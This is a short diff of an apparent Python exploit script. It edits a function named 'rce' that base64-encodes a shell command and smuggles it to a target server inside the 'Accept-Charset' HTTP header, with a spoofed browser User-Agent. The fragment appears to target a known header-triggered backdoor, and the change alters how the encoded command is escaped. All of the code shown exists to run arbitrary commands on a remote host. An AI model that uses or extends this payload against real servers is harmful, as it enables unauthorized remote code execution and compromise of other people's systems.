@@ -10,7 +10,7 @@ b64 = lambda s: base64.b64encode(s.encode())
 
 def rce(url, c):
     h = {
-        'Accept-Charset': b64(c).replace('/', '%2F'),
+        'Accept-Charset': b64(c),
         'Accept-Encoding': 'gzip,deflate',
         'User-Agent': 'Mozilla/5.0 Firefox/68.0',
     }
